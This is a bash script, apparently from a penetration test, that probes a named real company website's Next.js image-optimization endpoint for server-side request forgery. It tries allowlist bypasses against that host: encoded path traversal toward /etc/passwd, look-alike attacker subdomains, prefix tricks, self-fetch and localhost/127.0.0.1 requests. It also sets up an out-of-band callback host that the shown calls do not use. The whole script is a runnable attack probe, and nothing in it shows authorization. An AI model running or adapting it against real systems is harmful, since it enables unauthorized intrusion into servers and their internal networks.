#!/bin/bash
# Determine the /_next/image url= allowlist: 400=rejected-by-allowlist, 200=processed
T='https://www.infinitycapital.bh'
enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }
D="oast.abhedi.co.in"
H="oob32eea4622dac.$D"
p(){ printf "%-40s " "$2"; curl -sk -m 30 "$T/_next/image?url=$(enc "$1")&w=640&q=75" -o /tmp/al.bin -w "HTTP=%{http_code} sz=%{size_download} "; 
  if grep -q INVALID_IMAGE_OPTIMIZE /tmp/al.bin; then echo "ALLOWLIST-REJECT"; else file -b /tmp/al.bin | cut -c1-45; fi; }
echo "=== known-good contentful CDN ==="
p "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg" "ctfassets(known good)"
echo "=== same host, private-ish paths ==="
p "https://images.ctfassets.net/" "ctfassets root"
p "https://images.ctfassets.net/../../" "ctfassets traversal"
p "https://images.ctfassets.net/%2e%2e/%2e%2e/etc/passwd" "ctfassets enc traversal"
echo "=== subdomain of allowed domain ==="
p "https://evil.ctfassets.net/x.png" "evil.ctfassets.net"
p "https://images.ctfassets.net.evil.tld/x.png" "ctfassets prefix-trick"
p "https://ximages.ctfassets.net/y.png" "x-prefix ctfassets"
echo "=== the target itself (self-fetch) ==="
p "https://www.infinitycapital.bh/robots.txt" "self robots.txt"
p "https://www.infinitycapital.bh/favicon.ico" "self favicon"
echo "=== localhost variants ==="
p "http://localhost:3000/x.png" "localhost:3000"
p "http://127.0.0.1/x.png" "127.0.0.1"
echo DONE
